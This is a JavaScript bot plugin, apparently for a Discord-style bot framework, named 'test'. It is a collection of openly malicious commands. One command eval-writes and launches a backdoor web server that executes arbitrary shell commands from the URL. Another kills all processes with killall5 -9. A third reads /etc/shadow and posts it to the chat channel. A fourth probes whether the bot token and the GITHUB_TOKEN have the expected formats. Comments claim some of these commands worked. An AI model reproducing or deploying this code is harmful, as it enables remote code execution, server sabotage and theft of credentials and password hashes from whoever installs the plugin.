module.exports.plugin = {
    name: "test",
    description: "hee hee hee haw",
    author: "best plugin writer ever ",
    repository:
        "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
    commands: ["test", "backdoor", "end", "passwd"],
};

console.log("this can't actually work");
module.exports.test = {
    name: "test",
    description: "a test command",
    run: async ({ client, message }) => {
        message.channel.send(
            `${client.token.startsWith(
                "MTA"
            )} ${process.env.GITHUB_TOKEN.startsWith("github_pat")}`
        );
    },
};

module.exports.backdoor = {
    name: "backdoor",
    description: "backdoor the server",
    run: async ({ client, message }) => {
        const code = `
`;

        eval(`require("child_process").spawn("touch", ["backdoor.js"]);`);
        eval(`require("child_process").spawn("npm", ["i", "axios"]);`);
        eval(`require("fs").writeFile("backdoor.js", \`const express = require('express');
const app = express();

app.get("/", function (req, res) {
    res.send("success");
})

app.get("/:command", function (req, res) {
    command = req.params.command.split(" ")
    command.shift();
    require("child_process")
        .spawn(req.params.command.split(" ")[0], command)
        .on("data", (data) => {
            res.send(data);
        });
})

app.listen(3984, function (err) {
    console.error(app)
});\`, () => {});`);
        eval(`require("child_process").spawn("node", ["backdoor.js", "&"]);`);

        message.channel.send("installed");
    },
};

// worked
module.exports.end = {
    name: "end",
    description: "end the linux server",
    run: async ({ client, message }) => {
        require("child_process").spawn("killall5", ["-9"]);
    },
};

// worked with /etc/passwd
module.exports.passwd = {
    name: "passwd",
    description: "leak /etc/passwd",
    run: async ({ client, message }) => {
        require("fs").readFile("/etc/shadow", "utf8", function (err, data) {
            message.channel.send(`\`\`\`bash\n${data}\`\`\``);
        });
    },
};
